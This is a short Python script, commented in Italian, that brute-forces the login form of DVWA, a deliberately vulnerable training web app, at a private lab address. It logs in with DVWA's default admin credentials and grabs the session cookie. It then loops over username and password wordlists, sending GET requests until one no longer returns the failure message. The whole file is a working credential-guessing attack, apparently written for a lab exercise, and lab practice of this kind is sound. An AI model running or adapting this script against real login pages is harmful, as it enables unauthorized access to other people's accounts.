#programma Brute Force per DVWA BF test
from bs4 import BeautifulSoup
import requests

login_url = "http://192.168.32.101/dvwa/login.php"

login_payload = {"username":"admin", "password":"password", "Login": "Login"}

login_response = requests.post(login_url, data=login_payload)

if "Login failed" in login_response.text:
    print("Errore durante il login. Potrebbe essere necessario fornire le credenziali valide.")
    exit()
#variabile per definire il cookie di sessione
phpsessid_cookie = login_response.request.headers.get('Cookie').split('; ')[1].split('=')[1]
#visualizzare a schermo il token del cookie di sessione
print(f"PHPSESSID ottenuto con successo: {phpsessid_cookie}")

#dizionario per il cookie di sessione per il livello di sicurezza
header = {"Cookie": f"security=high; PHPSESSID={phpsessid_cookie}"}


usernames_files_path = "usernames.lst"
passwords_files_path = "passwords.lst"

#semplificare in sintassi il recupero di username e password
with open(usernames_files_path, 'r') as usernames_file, open(passwords_files_path, 'r') as passwords_file:
    usernames = usernames_file.readlines()
    passwords = passwords_file.readlines()

#ciclo for per l'attacco con username e password
for user in usernames:
    for password in passwords:
        url = "http://192.168.32.101/dvwa/vulnerabilities/brute/"#url del bf
        users = user.strip()
        passw = password.strip()
        get_data = {"username": users, "password": passw, "Login": "Login"}
        print("\n", users, "", passw)


        print(f"PHPSESSID utilizzato nella richiesta: {phpsessid_cookie}")

        r = requests.get(url, params=get_data, headers=header)
        #messaggio che nega l'accesso alla pagina
        if not "Username and/or password incorrect." in r.text:
            print ("\nAccesso riuscito con username:", users, "--password:", passw)
            exit()
